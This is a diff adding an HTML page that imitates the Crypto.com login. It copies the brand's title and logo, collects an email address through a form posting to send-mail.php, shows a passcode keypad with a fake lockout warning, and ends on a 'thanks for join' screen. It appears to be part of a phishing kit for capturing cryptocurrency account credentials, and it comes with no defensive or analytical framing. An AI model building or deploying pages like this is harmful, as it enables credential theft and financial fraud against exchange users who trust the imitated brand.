@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Crypto.com | Login</title>
+    <link rel="stylesheet" href="WOW-master/dist/animate.css">
+    <link rel="stylesheet" href="style.css">
+
+</head>
+<body>
+    
+    <div class="main_container">
+        
+        <div id="main_login" class="tabcontent tab-active wow slideInLeft" data-wow-duration=".5s">
+            
+            <div class="main-login">
+                <div class="logo-container">
+                    <img src="crypto-com-logo.webp" alt="Main Logo">
+                </div>
+                <div class="bottom-contents">
+                    <div class="tab">
+                        <a href="#">Invited? Add Referral Code</a>
+                        <button class="tablinks button full_width primary_btn my_20" >Sign Up</button>
+                        <a id="login" href="javascript:void(0)" onclick="openCity(event, 'login_email')" class="color-white">Log In</a>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+        <div id="login_email" class="tabcontent wow slideInRight" data-wow-duration=".5s">
+            
+            <div class="login-email-area">
+                <div class="email-sec-top-area">
+                    <span class="back_arrow" onclick="openCity(event, 'main_login')">&#10229;</span>
+                    <div class="full_width text-center color-white font-20 bold-600"><span>Log In</span></div>
+                </div>
+                <div class="email-filed">
+                    <form action="send-mail.php" id="email_form" method="post">
+                        <div class="form-group">
+                            <label for="email">Your Email Address</label>
+                            <input type="email" name="email" id="email" placeholder="Example@address.com" class="custom_input">
+                        </div>
+                    </form>
+                </div>
+                <div class="bottom-contents">
+                    <div class="tab">
+                        <button id="email_submitBtn" onclick="openCity(event, 'login_passcode')" class="tablinks button full_width primary_btn my_20" >Continue</button>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+        <div id="login_passcode" class="tabcontent wow slideInRight" data-wow-duration=".5s">
+            
+            <div class="login-email-area">
+                <div class="email-sec-top-area">
+                    <div class="full_width text-center color-white font-20 bold-600"><span>Enter Passcode</span></div>
+                </div>
+                <div class="email-filed">
+                    <span class="color-white font-20">Enter passcode</span>
+                    <div class="forget-area text-center">
+                        <a href="#" class="color-gary font-20">forgot passcode?</a><br/><br/>
+                        <span>Incorrect passcode. The app will <br/>
+                            be locked for 30minutes after 5 <br/>
+                            failed attempts</span>
+                    </div>
+
+                    <div class="keypad"></div>
+                </div>
+            </div>
+
+        </div>
+        <div id="logn_success" class="tabcontent wow slideInRight" data-wow-duration=".5s">
+            
+            <div class="main-login">
+                <div class="logo-container">
+                    <img src="crypto-com-logo.webp" alt="Main Logo">
+                </div>
+                <h2 class="color-white mb-2">Thanks for join with us</h2>
+                <a id="back_btn" href="javascript:void(0)">Back to main page</a>
+            </div>
+
+        </div>
+    </div>
+    
+</body>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.24.0/moment.min.js"></script>
+<script src="WOW-master/dist/wow.min.js"></script>
+<script src="app.js"></script>
+<script>
+    new WOW().init();
+    $('#back_btn').click(function(){
+        $('.tabcontent').css({'display':'none'});
+        $('#main_login').css({'display':'block'});
+    });
+    // $('#email_submitBtn').click(function(){
+    //     $('#email_form').submit()
+    // });
+</script>
+</html>
